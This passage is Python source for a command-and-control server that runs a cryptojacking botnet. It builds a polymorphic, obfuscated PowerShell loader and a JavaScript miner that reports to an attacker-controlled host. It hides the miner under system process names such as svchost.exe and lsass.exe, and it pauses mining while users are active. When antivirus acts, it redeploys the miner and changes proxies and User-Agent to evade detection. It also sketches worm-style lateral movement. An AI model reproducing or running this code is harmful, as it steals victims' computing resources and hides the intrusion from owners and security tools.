        loader_script = loader_script.replace("CERT_PUBKEY_HASH", CERT_PUBKEY_HASH)
    else:
        loader_script = loader_script.replace('$certPubKeyHash = "CERT_PUBKEY_HASH"', '$certPubKeyHash = "" # Certificate pinning disabled')

    # Dynamic variable renaming for loader
    loader_var_map = {
        "Create-AesManagedObject": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))),
        "Decrypt-String": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))),
        "Invoke-WebRequestWithPinning": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20))),
        "$ip": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$port": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$id": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$key": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$scheme": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$certPubKeyHash": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$stagedPayloadPath": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$fullEncryptedPayload": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$chunkIndex": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$totalChunks": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$chunkUri": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$response": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$chunkContent": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$headers": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$encryptedB64": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$decryptedScript": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
    }
    for old, new in loader_var_map.items():
        loader_script = re.sub(r'\b' + re.escape(old) + r'\b', new, loader_script)

    loader_script = f"# Staged Loader: {''.join(random.choices('abcdefghijklmnopqrstuvwxyz ', k=random.randint(20, 50))).strip()}\n" + loader_script

    return loader_script


def generate_obfuscated_miner_js(obfuscation_hash=None, process_name=None):
    """Generates an obfuscated JavaScript miner with dynamic intensity logic
    and real hashing, and process cloaking capabilities."""
    if obfuscation_hash is None:
        obfuscation_hash = hashlib.sha256(str(time.time()).encode()).hexdigest()[:8] # Default if not provided
    
    if process_name is None:
        process_name = CONFIG["DEFAULT_MINER_PROCESS_NAME"] # Use default if not specified

    # Miner now connects to C2's WebSocket endpoint which acts as a proxy, and the C2 now uses wss (secure websocket)
    miner_js_template = f"""
const WebSocket = require('ws');
const os = require('os');
const crypto = require('crypto'); // For hashing

// Unique identifier for this miner instance (tied to agent_id and its obfuscation state)
const MINER_ID = '{obfuscation_hash}'; 

const config = {{
    // C2 is the proxy, now using WSS for secure WebSocket connection
    poolUrl: 'wss://{CONFIG["ATTACKER_IP"]}:{CONFIG["ATTACKER_PORT"]}{get_c2_path("websocket")}', 
    wallet: '{CONFIG["MINER_WALLET_ADDRESS"]}',
    workerId: 'worker_' + MINER_ID, // Use obfuscation hash for worker ID
    intensity: {CONFIG["DEFAULT_MINER_INTENSITY"]}, // Initial intensity
    currentProcessName: '{process_name}' // Initial process name for cloaking
}};

// Set the Node.js process title for cloaking.
// This changes what's visible in Task Manager (on Windows) or `ps` (on Linux).
// For a deeper disguise, the actual node.exe binary would need to be renamed
// or a native wrapper used.
try {{
    process.title = config.currentProcessName;
    console.log('Process title set to: ' + process.title);
}} catch (e) {{
    console.warn('Could not set process title:', e.message);
}}


function performHash(data) {{
    // This function performs computationally intensive hashing work,
    // making the miner.js more 'real' than a simulation.
    // The intensity dictates how many hashing iterations are performed,
    // simulating more or less CPU usage for 'mining' activities.
    
    let currentHash = data + config.workerId;
    // The number of hashing cycles scales linearly with the configured intensity.
    // For example, intensity 1.0 will do 10,000 iterations, 0.1 will do 1,000.
    const iterations = Math.floor(config.intensity * 10000); 

    for (let i = 0; i < iterations; i++) {{
        // Repeatedly hash the previous result concatenated with the iteration number.
        // This makes the computation progressively different in each loop.
        currentHash = crypto.createHash('sha256').update(currentHash + String(i)).digest('hex');
    }}
    // Return the final hash after all iterations.
    return currentHash;
}}

let ws;
let miningJob = null;
let miningInterval = null;

function connectMiner() {{
    # Note: For Node.js, for self-signed certificates, you typically either need to
    # set NODE_TLS_REJECT_UNAUTHORIZED='0' environment variable or provide the CA certificate
    # through the 'ca' option in the WebSocket constructor if you want full validation.
    # For simplicity and to match the 'ssl=False' in aiohttp.ClientSession, we use rejectUnauthorized: false.
    ws = new WebSocket(config.poolUrl + '?agent_id=' + config.workerId, {{ rejectUnauthorized: false }});
    ws.onopen = () => {{
        console.log('Miner WS Connected to C2. ID: ' + config.workerId);
        // Send initial login/telemetry request
        ws.send(JSON.stringify({{ type: 'telemetry' }})); 
    }};
    ws.onmessage = (event) => {{
        const msg = JSON.parse(event.data);
        if (msg.type === 'job') {{
            miningJob = msg;
            if (!miningInterval) {{
                startMiningLoop();
            }}
        }} else if (msg.type === 'intensity') {{
            // C2 sends new intensity based on telemetry
            config.intensity = parseFloat(msg.intensity);
            console.log('Received new intensity from C2: ' + config.intensity);

            // Check for new process name for cloaking
            if (msg.processName && msg.processName !== config.currentProcessName) {{
                config.currentProcessName = msg.processName;
                try {{
                    process.title = config.currentProcessName;
                    console.log('Process title updated to: ' + process.currentProcessName);
                }} catch (e) {{
                    console.warn('Could not update process title:', e.message);
                }}
            }}

            if (config.intensity <= 0.05) {{ // If intensity is too low, effectively stop
                stopMiningLoop();
            }} else if (!miningInterval) {{
                startMiningLoop(); // Restart if intensity increased
            }}
        }} else if (msg.type === 'command') {{
            // Handle specific commands from C2 for miner process
            // e.g., to terminate self, update self, etc.
            if (msg.cmd === 'stop') {{
                stopMiningLoop();
                console.log('Miner stopped by C2 command.');
            }}
        }}
    }};
    ws.onclose = () => {{
        console.log('Miner WS Disconnected. Reconnecting in 5s...');
        stopMiningLoop(); // Ensure loop stops on disconnect
        setTimeout(connectMiner, 5000);
    }};
    ws.onerror = (err) => {{
        console.error('Miner WS Error:', err.message);
        ws.close();
    }};
}}

function startMiningLoop() {{
    if (miningInterval) clearInterval(miningInterval);
    if (config.intensity > 0.05) {{
        // Adjust interval based on intensity: lower intensity = longer interval
        // This ensures that at even low intensity, the loop still runs,
        // but hashes fewer times per interval.
        const intervalMs = Math.max(100, 1000 / (config.intensity * 5)); // Min 100ms
        miningInterval = setInterval(() => {{
            if (miningJob) {{
                const result = performHash(miningJob.data); // Call the real hashing function
                ws.send(JSON.stringify({{ type: 'submit', job_id: miningJob.job_id, result: result, workerId: config.workerId }}));
                miningJob = null; // Mark job as done
            }} else {{
                // Request a new job if current one is done or null
                ws.send(JSON.stringify({{ type: 'telemetry' }})); // Use telemetry to indirectly request job/intensity
            }}
        }}, intervalMs);
        console.log('Mining loop started with intensity ' + config.intensity + ' and interval ' + intervalMs + 'ms');
    }}
}}

function stopMiningLoop() {{
    if (miningInterval) {{
        clearInterval(miningInterval);
        miningInterval = null;
        console.log('Mining loop stopped.');
    }}
}}

// Start the miner connection
connectMiner();
"""
    # Apply simple obfuscation to the JavaScript code
    obfuscated_js = ""
    # Randomize variable names
    js_template = re.sub(r'\bconfig\b', f"cfg{obfuscation_hash}", miner_js_template)
    js_template = re.sub(r'\bws\b', f"wsC{obfuscation_hash}", js_template)
    js_template = re.sub(r'\bconnectMiner\b', f"connM{obfuscation_hash}", js_template)
    js_template = re.sub(r'\bperformHash\b', f"doHash{obfuscation_hash}", js_template) # Changed to match new function name
    js_template = re.sub(r'\bminingJob\b', f"mjb{obfuscation_hash}", js_template)
    js_template = re.sub(r'\bminingInterval\b', f"minInt{obfuscation_hash}", js_template)
    js_template = re.sub(r'\bmsg\b', f"mg{obfuscation_hash}", js_template)
    js_template = re.sub(r'\bstartMiningLoop\b', f"startML{obfuscation_hash}", js_template)
    js_template = re.sub(r'\bstopMiningLoop\b', f"stopML{obfuscation_hash}", js_template)
    
    for line in js_template.splitlines():
        # Inject random comments
        if random.random() < 0.2: # 20% chance to add a comment
            comment_text = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))
            obfuscated_js += f"/* {comment_text} */\n"
        # Randomize whitespace
        obfuscated_js += "  " * random.randint(0, 3) + line.strip() + "\n"
    
    # Add a random string to the end to change hash
    obfuscated_js += f"// Tail: {''.join(random.choices('0123456789abcdef', k=random.randint(10, 20)))}\n"

    return obfuscated_js

# Store full agent payloads (encrypted) for chunked delivery
agent_payload_cache = {}

# --- Automation and Decision-Making (Core C2 Logic) ---
async def schedule_tasks():
    """
    Automated task scheduling based on agent state, playbooks, and time.
    Runs periodically to maintain C2 objectives.
    """
    global last_bulk_instruction_time # Declare global to modify
    global last_initial_setup_time # Declare global to modify

    while True:
        try:
            now = datetime.now(UTC)
            
            # --- Initial Setup Task Assignment (Controlled Batch) ---
            if (now - last_initial_setup_time).total_seconds() >= CONFIG["INITIAL_SETUP_COOLDOWN"]:
                # Find agents that haven't completed initial setup
                agents_for_initial_setup = list(agents_collection.find({
                    'is_initial_setup_done': False,
                    'status': 'active'
                }).limit(CONFIG["MINERS_PER_MINUTE"])) # Use MINERS_PER_MINUTE to limit batch size for initial setup as well

                if agents_for_initial_setup:
                    log_event('automation', f"Attempting initial setup for {len(agents_for_initial_setup)} agents.")
                    for agent in agents_for_initial_setup:
                        agent_id = agent['agent_id']
                        # Check if powershell_delivery or stealth_initial_setup are already pending to avoid duplicates
                        if not tasks_collection.find_one({'agent_id': agent_id, 'status': 'pending', 'command': "powershell_delivery"}):
                            await assign_task_db(agent_id, "powershell_delivery", priority=10)
                            log_event('instruction', f"Assigned powershell_delivery to {agent_id}.", agent_id=agent_id)
                        
                        if not tasks_collection.find_one({'agent_id': agent_id, 'status': 'pending', 'command': "stealth_initial_setup"}):
                            await assign_task_db(agent_id, "stealth_initial_setup", priority=9)
                            log_event('instruction', f"Assigned stealth_initial_setup to {agent_id}.", agent_id=agent_id)
                        
                        # Mark initial setup as done for this agent after attempting to assign the tasks.
                        # The agent's actual completion will be reflected in task results.
                        agents_collection.update_one({'agent_id': agent_id}, {'$set': {'is_initial_setup_done': True}}) 
                        
                    last_initial_setup_time = now # Update cooldown for initial setup tasks after processing a batch
                else:
                    log_event('info', "No agents currently requiring initial setup tasks.")
            else:
                log_event('info', f"Initial setup tasks on cooldown. Next batch in {CONFIG['INITIAL_SETUP_COOLDOWN'] - (now - last_initial_setup_time).total_seconds():.0f} seconds.")


            # --- Regular Agent Automation (per agent, for those with initial setup done) ---
            # This loop handles ongoing management of agents *after* their initial setup.
            agents_for_automation = agents_collection.find({'status': 'active', 'is_initial_setup_done': True})
            
            for agent in agents_for_automation:
                agent_id = agent['agent_id']
                playbook = playbooks_collection.find_one({'playbook_id': agent.get('playbook_id', 1)}) # Default to Playbook 1
                if not playbook: # Ensure playbook exists
                    log_event('warning', f"Playbook ID {agent.get('playbook_id')} not found for agent {agent_id}. Skipping automation for this agent.", agent_id=agent_id)
                    continue

                # Retrieve latest telemetry
                telemetry = agent.get('telemetry', {})
                miner_status = telemetry.get('status', 'stopped')
                cpu_usage = float(telemetry.get('cpu', 0))
                mem_usage = float(telemetry.get('mem', 100)) # Free mem percent, higher is better
                security_events = telemetry.get('security_events', [])
                timezone_offset = agent.get('timezone_offset', 0)
                current_miner_process_name = agent.get('current_process_name', CONFIG["DEFAULT_MINER_PROCESS_NAME"])
                
                # Determine local hour based on agent's reported offset
                local_hour = (now.hour + int(timezone_offset)) % 24 
                is_active_hours = CONFIG["ACTIVE_HOURS_START"] <= local_hour < CONFIG["ACTIVE_HOURS_END"]
                
                # --- Miner Protection & Stealth Logic (per agent) ---
                
                # 1. Active User Hours Detection & Sleep/Wake Miner
                if playbook['type'] == 'mining':
                    # Check if the playbook explicitly defines active hours, otherwise use global CONFIG
                    playbook_active_hours_start = playbook.get('active_hours_start', CONFIG["ACTIVE_HOURS_START"])
                    playbook_active_hours_end = playbook.get('active_hours_end', CONFIG["ACTIVE_HOURS_END"])

                    # Re-evaluate is_active_hours based on playbook-specific times
                    if playbook_active_hours_start < playbook_active_hours_end:
                        # Standard range (e.g., 8 AM to 6 PM)
                        is_active_hours = playbook_active_hours_start <= local_hour < playbook_active_hours_end
                    else:
                        # Overnight range (e.g., 6 PM to 8 AM)
                        is_active_hours = local_hour >= playbook_active_hours_start or local_hour < playbook_active_hours_end


                    if is_active_hours and miner_status == 'running':
                        log_event('automation', f"Agent {agent_id}: Active hours detected ({local_hour}:00). Stopping miner for stealth.", agent_id=agent_id)
                        await assign_task_db(agent_id, "stop_mining", priority=8)
                        agents_collection.update_one({'agent_id': agent_id}, {'$set': {'last_miner_stop_time': now}})
                    elif not is_active_hours and miner_status == 'stopped':
                        # Only start if it's been stopped for a minimum duration (e.g., beyond grace period or intentional stop)
                        # or if it unexpectedly stopped and needs redeployment.
                        last_stop_time = agent.get('last_miner_stop_time')
                        # Ensure last_stop_time is UTC-aware if it exists
                        if last_stop_time and last_stop_time.tzinfo is None:
                            last_stop_time = last_stop_time.replace(tzinfo=UTC)

                        if last_stop_time is None or (now - last_stop_time).total_seconds() >= CONFIG["MINER_REDEPLOY_GRACE_PERIOD"]:
                            # Calculate dynamic intensity based on available CPU %
                            # (100 - CPU_Usage) gives available CPU. Scale it.
                            available_cpu = 100 - cpu_usage
                            # Use a proportional control logic: more available CPU, higher intensity (up to max)
                            # Clamped between 0.1 (min viable) and playbook's defined max intensity
                            intensity = max(0.1, min(playbook.get('intensity', CONFIG["DEFAULT_MINER_INTENSITY"]), available_cpu * CONFIG["IDLE_MINING_INTENSITY_FACTOR"]))
                            
                            # Further reduce intensity if current CPU is already high (aggressive throttling)
                            if cpu_usage > CONFIG["MAX_CPU_THRESHOLD_FOR_MINING"]:
                                intensity = 0.05 # Near stop
                            elif cpu_usage > (CONFIG["MAX_CPU_THRESHOLD_FOR_MINING"] * 0.7): # Moderate CPU
                                intensity *= 0.5 # Halve it

                            if intensity > 0.05: # Only start if calculated intensity is meaningful
                                log_event('automation', f"Agent {agent_id}: Off-hours/idle detected. Starting miner with intensity {intensity:.2f} (CPU: {cpu_usage:.1f}%).", agent_id=agent_id)
                                await assign_task_db(agent_id, f"start_mining|{intensity:.2f}", priority=7)
                                agents_collection.update_one({'agent_id': agent_id}, {'$set': {'last_miner_stop_time': None}}) # Clear stop time
                            else:
                                log_event('automation', f"Agent {agent_id}: Not starting miner, insufficient CPU availability or high usage detected ({cpu_usage:.1f}%).", agent_id=agent_id)


                # 2. Miner Self-Healing & Polymorphic Redeployment (per agent)
                # If miner is stopped but should be running (e.g., killed by AV or crashed)
                if miner_status == 'stopped' and playbook.get('auto_redeploy', False):
                    last_stop_time = agent.get('last_miner_stop_time')
                    # Ensure last_stop_time is UTC-aware if it exists
                    if last_stop_time and last_stop_time.tzinfo is None:
                        last_stop_time = last_stop_time.replace(tzinfo=UTC)

                    if last_stop_time is None or (now - last_stop_time).total_seconds() >= CONFIG["MINER_REDEPLOY_GRACE_PERIOD"]:
                        log_event('automation', f"Agent {agent_id}: Miner unexpectedly stopped. Initiating polymorphic redeployment.", agent_id=agent_id)
                        
                        # Generate a new obfuscation hash for the miner.js
                        new_obfuscation_hash = hashlib.sha256(os.urandom(16)).hexdigest()[:8]
                        
                        # Randomly pick a new process name from a list of common system processes
                        common_process_names = ["svchost.exe", "explorer.exe", "taskhostw.exe", "RuntimeBroker.exe", "dllhost.exe", "csrss.exe"]
                        new_process_name = random.choice(common_process_names)
                        
                        agents_collection.update_one({'agent_id': agent_id}, 
                                                     {'$set': {'obfuscation_hash': new_obfuscation_hash, 
                                                               'current_process_name': new_process_name}})
                        
                        # Update the miner.js file on the C2 server for next deploy
                        # The content written here will be the base64 encoded JavaScript.
                        with open(MINER_JS_PATH, 'w') as f:
                            raw_js = generate_obfuscated_miner_js(new_obfuscation_hash, new_process_name)
                            f.write(base64.b64encode(raw_js.encode()).decode()) 
                        
                        # Assign tasks to redeploy and restart the miner
                        await assign_task_db(agent_id, "deploy_miner", priority=9) # Higher priority for redeploy
                        # Restart with a reasonable default intensity after redeployment
                        await assign_task_db(agent_id, f"start_mining|{playbook.get('intensity', CONFIG['DEFAULT_MINER_INTENSITY'])}", priority=9)
                        
                        agents_collection.update_one({'agent_id': agent_id}, {'$set': {'last_miner_stop_time': now}}) # Set stop time to avoid quick loops
                
                # 3. Telemetry Reporting (Ensure agents are always reporting)
                # Apply playbook-defined beacon interval and jitter, or use defaults
                base_beacon = playbook.get('base_beacon_interval', CONFIG['BASE_BEACON_INTERVAL'])
                jitter_percent = playbook.get('beacon_jitter_percent', CONFIG['BEACON_JITTER_PERCENT'])
                
                # Update agent's beaconing parameters in DB
                agents_collection.update_one(
                    {'agent_id': agent_id},
                    {'$set': {
                        'base_beacon_interval': base_beacon,
                        'beacon_jitter_percent': jitter_percent,
                    }}
                )

                # Ensure 'last_telemetry' is UTC-aware for the comparison
                last_telemetry_time = agent.get('last_telemetry')
                if last_telemetry_time and last_telemetry_time.tzinfo is None:
                    last_telemetry_time = last_telemetry_time.replace(tzinfo=UTC)
                # Use a default that is also UTC-aware if 'last_telemetry' is None
                else:
                    last_telemetry_time = now - timedelta(seconds=base_beacon + 10)


                if (now - last_telemetry_time).total_seconds() > base_beacon:
                    log_event('automation', f"Agent {agent_id}: Requesting updated telemetry (base interval).", agent_id=agent_id)
                    await assign_task_db(agent_id, "report_telemetry", priority=0) # Low priority, background task

                # 4. Handle Security Events (from telemetry) - Made more reactive
                if security_events:
                    for event in security_events:
                        log_event('security_alert', f"Agent {agent_id} Security Event: {event.get('Message', 'N/A')}", agent_id=agent_id)
                        
                        # Real handling of AV alerts: change egress or process name
                        # This logic would be refined based on specific AV alert messages.
                        lower_message = event.get('Message', '').lower()
                        if "antivirus" in lower_message or "malware" in lower_message or "detected" in lower_message:
                             log_event('automation', f"Agent {agent_id}: AV detected. Initiating evasive maneuvers.", agent_id=agent_id)
                             
                             # Strategy 1: Change Egress Configuration (e.g., use a proxy)
                             # This is an example, real proxies would need to be available.
                             new_proxy = random.choice(["http://192.168.1.1:8080", "http://10.0.0.5:3128", "DIRECT"]) # "DIRECT" means no proxy
                             await assign_task_db(agent_id, f"set_egress_config|proxy|{new_proxy}", priority=10)
                             log_event('automation', f"Agent {agent_id}: Assigned task to change egress to proxy: {new_proxy}.", agent_id=agent_id)

                             # Strategy 2: Change User-Agent to mimic legitimate traffic
                             new_user_agent = random.choice([
                                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
                                 "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
                                 "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
                             ])
                             await assign_task_db(agent_id, f"set_egress_config|user_agent|{new_user_agent}", priority=10)
                             log_event('automation', f"Agent {agent_id}: Assigned task to change User-Agent.", agent_id=agent_id)

                             # Strategy 3: Immediately change process name to something more benign/random
                             random_benign_name = random.choice(["RuntimeBroker.exe", "dllhost.exe", "csrss.exe", "lsass.exe"])
                             await assign_task_db(agent_id, f"change_miner_process_name|{random_benign_name}", priority=10)
                             agents_collection.update_one({'agent_id': agent_id}, {'$set': {'current_process_name': random_benign_name}})
                             
                             # Optionally, switch to a defensive playbook
                             # agents_collection.update_one({'agent_id': agent_id}, {'$set': {'playbook_id': 7}}) # Switch to Defensive Persistence
                             # log_event('automation', f"Agent {agent_id}: Switched to Defensive Persistence Playbook.", agent_id=agent_id)

                # 5. DNS Beaconing (Fallback / Low-Bandwidth Check-in)
                # If DNS beaconing is enabled and it's time for the next beacon
                if playbook.get('enable_dns_beacon', False):
                    last_dns_beacon = agent.get('last_dns_beacon', datetime.min.replace(tzinfo=UTC))
                    # Use the DNS_BEACON_INTERVAL from CONFIG for DNS beaconing frequency
                    if (now - last_dns_beacon).total_seconds() >= CONFIG["DNS_BEACON_INTERVAL"]:
                        log_event('automation', f"Agent {agent_id}: Sending DNS beacon for fallback/stealth check-in.", agent_id=agent_id)
                        # We are just assigning the task to the agent here.
                        # The actual DNS query happens on the agent side.
                        # The C2 would need external DNS logging to receive this.
                        await assign_task_db(agent_id, "send_dns_beacon|checkin", priority=1) # Very low priority
                        agents_collection.update_one({'agent_id': agent_id}, {'$set': {'last_dns_beacon': now}})

                # 6. Worm-like Propagation (new logic)
                if playbook['type'] == 'worm' and playbook.get('auto_propagate', False):
                    # For a simple demo, we'll just log an intent to propagate.
                    # In a real scenario, this would involve more sophisticated target discovery
                    # and and decision-making by the C2, then issuing specific WMI/PsExec/Share tasks.
                    log_event('automation', f"Agent {agent_id}: Worm playbook active. Initiating propagation attempts.", agent_id=agent_id)
                    
                    # Example: Find a random active agent and try to move laterally (for demo purposes)
                    active_agents = list(agents_collection.find({'status': 'active', 'agent_id': {'$ne': agent_id}}))
                    if active_agents:
                        target_agent = random.choice(active_agents)
                        log_event('automation', f"Agent {agent_id} considering lateral movement to {target_agent['agent_id']}.", agent_id=agent_id)
                        # Here, you might assign a WMI_EXEC or PROPAGATE_SHARE task to agent_id
                        # to push a loader to target_agent's IP.
                        
                        # Example: Try to copy loader to target's C$ share (assuming admin rights on agent_id)
                        # For a real implementation, the C2 would track the current loader path or provide it.
                        # For now, let's assume the payload to propagate is always the C# launcher that launched them.
                        # This would be an instruction to the *current* agent (agent_id) to perform the copy.
                        # await assign_task_db(agent_id, f"propagate_share|\\\\{target_agent['ip_address']}\\c$\\temp\\StagedLauncher.exe|StagedLauncher.exe", priority=9)
                        # log_event('automation', f"Agent {agent_id}: Assigned task to propagate to {target_agent['ip_address']}.", agent_id=agent_id)
                    else:
                        log_event('automation', f"Agent {agent_id}: No other active agents found for lateral propagation.", agent_id=agent_id)


            # Clear completed tasks to keep DB lean (optional, good practice)
            tasks_collection.delete_many({'status': 'completed', 'completion_time': {'$lt': now - timedelta(days=7)}})
            
        except Exception as e:
            log_event('automation_error', f"Error in schedule_tasks: {e}", agent_id="N/A")
            log_crash(e, traceback.format_exc())
            
        # Bulk miner instruction logic (with cooldown)
        current_time = datetime.now(UTC)
        if (current_time - last_bulk_instruction_time).total_seconds() >= CONFIG["MINER_INSTRUCTION_COOLDOWN"]:
            # Only consider agents that have completed initial setup for bulk mining instructions
            eligible_miners = list(agents_collection.find({
                'is_initial_setup_done': True, # Only target agents that have completed initial setup
                '$or': [
                    {'is_following_instructions': False},
                    {'instruction_expiration': {'$lt': current_time}}
                ],
                'status': 'active'
            }))
            
            if len(eligible_miners) >= CONFIG["MINIMUM_MINERS"]:
                miners_to_instruct = eligible_miners[:CONFIG["MINERS_PER_MINUTE"]]
                for miner in miners_to_instruct:
                    agent_id = miner['agent_id']
                    playbook_id = miner.get('playbook_id', 1)
                    playbook = playbooks_collection.find_one({'playbook_id': playbook_id})
                    if not playbook:
                        # Fallback if playbook not found, assign a default intensity
                        log_event('warning', f"Playbook ID {playbook_id} not found for agent {agent_id}. Using default mining intensity.", agent_id=agent_id)
                        intensity = CONFIG["DEFAULT_MINER_INTENSITY"]
                    else:
                        intensity = playbook.get('intensity', CONFIG["DEFAULT_MINER_INTENSITY"])

                    # Assign start mining task if agent is not already running miner or its instruction expired
                    # This check is now mostly handled by the `eligible_miners` query, but kept for robustness.
                    if agent.get('miner_status') != 'running' or agent.get('instruction_expiration') is None or agent.get('instruction_expiration') < current_time:
                         command = f"start_mining|{intensity}"
                         await assign_task_db(agent_id, command, priority=5)
                         agents_collection.update_one(
                             {'agent_id': agent_id},
                             {'$set': {
                                 'is_following_instructions': True,
                                 'instruction_expiration': current_time + timedelta(seconds=CONFIG["INSTRUCTION_EXPIRATION"])
                             }}
                         )
                         log_event('instruction', f"Assigned {command} to {agent_id}, expires at {(current_time + timedelta(seconds=CONFIG["INSTRUCTION_EXPIRATION"])).strftime('%H:%M:%S UTC')}")
            
                last_bulk_instruction_time = current_time # Update last instruction time after a batch
            else:
                log_event('info', f"Not enough eligible miners ({len(eligible_miners)} < {CONFIG['MINIMUM_MINIMUM']}) for bulk mining instruction.") # Corrected typo in log
        else:
            log_event('info', f"Bulk miner instruction on cooldown. Next instruction in {CONFIG['MINER_INSTRUCTION_COOLDOWN'] - (current_time - last_bulk_instruction_time).total_seconds():.0f} seconds.")
        
        await asyncio.sleep(60) # Re-evaluate every minute

async def health_check():
    """Performs periodic health checks on C2 components."""
    # Declare client and db as global here so we can reassign them if reconnection is needed.
    global client, db, app 
    while True:
        try:
            # MongoDB Health Check
            # Use the existing client to ping. If it fails, the exception is caught.
            client.admin.command('ping')
            log_event('health', "MongoDB: OK")
        except Exception as e:
            log_event('health_alert', f"MongoDB connection failed: {e}. Attempting reconnection.", agent_id="N/A")
            log_crash(e, traceback.format_exc())
            try:
                # Re-initialize client and db using the global variables.
                client = pymongo.MongoClient(MongoURI)
                db = client['c2_database']
                log_event('health', "MongoDB: Reconnected.")
            except Exception as reconnect_e:
                log_event('health_critical', f"MongoDB reconnection failed: {reconnect_e}. Manual intervention may be required.", agent_id="N/A")
                log_crash(reconnect_e, traceback.format_exc())

        # Web Server Health Check (ping its own /health endpoint)
        try:
            # FIX: Use the Host variable for health checks, falling back to 127.0.0.1 if Host is '0.0.0.0'.
            health_check_target_ip = "127.0.0.1" if Host == "0.0.0.0" else Host 
            async with aiohttp.ClientSession() as session:
                resp = await session.get(f"https://{health_check_target_ip}:{Port}/health", timeout=5, ssl=False)
                if resp.status == 200:
                    log_event('health', "Web Server: OK")
                else:
                    raise Exception(f"Web server responded with status {resp.status}")
        except Exception as e:
            log_event('health_alert', f"Web server failed: {e}. Checking if a restart is needed.", agent_id="N/A")
            log_crash(e, traceback.format_exc())
            
            log_event('health_alert', "Manual intervention may be required to restart web server if it's truly down.", agent_id="N/A")

        await asyncio.sleep(CONFIG["HEALTH_CHECK_INTERVAL"])

# --- HTTP Endpoint Handlers ---
# These handlers process incoming requests from agents
async def handle_registration(request):
    """Handles agent registration via GET request."""
    agent_id = request.match_info['agent_id']
    request_ip = request.remote  # IP address of the incoming connection
    aes_key = Fernet.generate_key() # Generate a fresh key for each registration
    
    # Attempt to get self-reported IP from agent's custom header (now JSON)
    self_reported_telemetry_json = request.headers.get('X-Agent-Telemetry') # Agent sends telemetry as header in reg
    agent_ip = None
    if self_reported_telemetry_json:
        try:
            telemetry_data = json.loads(self_reported_telemetry_json)
            agent_ip = telemetry_data.get('agent_ip')
        except json.JSONDecodeError as e:
            log_event('warning', f"Could not parse self-reported telemetry JSON from X-Agent-Telemetry header for {agent_id}: {e}", agent_id=agent_id)
        except Exception as e:
            log_event('warning', f"Unexpected error processing self-reported telemetry header for {agent_id}: {e}", agent_id=agent_id)


    await register_agent_db(agent_id, request_ip, aes_key, agent_ip)
    
    # Send back the AES key for the agent to use
    return web.Response(text=aes_key.decode(), content_type=CONFIG["C2_PROFILE"]["REGISTER"]["content_type"])

async def handle_task_retrieval(request):
    """Handles agent task retrieval via GET request."""
    agent_id = request.match_info['agent_id']
    
    agent_doc = agents_collection.find_one({'agent_id': agent_id})
    if not agent_doc:
        log_event('error', f"Agent {agent_id} requested task but is not registered.", agent_id=agent_id)
        return web.Response(status=404, text="Agent not found")
    
    f = Fernet(agent_doc['aes_key'].encode())
    
    # Retrieve the highest priority pending task for this agent
    task = tasks_collection.find_one_and_update(
        {'agent_id': agent_id, 'status': 'pending'},
        {'$set': {'status': 'assigned'}}, # Mark as assigned to prevent re-issuance
        sort=[('priority', -1), ('submission_time', 1)] # Highest priority, then oldest
    )
    
    if task:
        command_to_send = task['command']
        # If it's a powershell_delivery task, generate the polymorphic loader script
        if command_to_send == "powershell_delivery":
            # Generate the full polymorphic agent script (main payload)
            current_miner_proc_name = agent_doc.get('current_process_name', CONFIG["DEFAULT_MINER_PROCESS_NAME"])
            full_polymorphic_ps_script = generate_polymorphic_powershell(agent_id, agent_doc['aes_key'], current_miner_proc_name)
            
            # Encrypt the full payload for staged delivery
            encrypted_full_payload = f.encrypt(full_polymorphic_ps_script.encode())
            agent_payload_cache[agent_id] = encrypted_full_payload # Cache for chunked delivery

            # Send back the small, staged loader script
            staged_loader_script = generate_staged_powershell_loader(agent_id, agent_doc['aes_key'])
            encrypted_task = f.encrypt(staged_loader_script.encode()) # Encrypt the loader itself
            log_event('task_sent', f"Staged PowerShell loader sent to {agent_id}", agent_id=agent_id)
        elif command_to_send.startswith("stealth_initial_setup"):
            # For 'stealth_initial_setup', no special script is needed as it's part of the main agent's capabilities.
            # We just need to signal the agent to execute its internal 'stealth_initial_setup' logic.
            # The agent will then report back the results as a normal task result.
            encrypted_task = f.encrypt(command_to_send.encode())
            log_event('task_sent', f"Stealth initial setup task sent to {agent_id}", agent_id=agent_id)
        elif command_to_send.startswith("change_miner_process_name|"):
            # When the C2 wants to change the miner process name
            new_name = command_to_send.split('|')[1]
            # This task changes the process name only in the DB and then updates miner.js
            # The next 'start_mining' or 'deploy_miner' will use the new name.
            # The miner.js itself needs to receive this update to change its process.title.
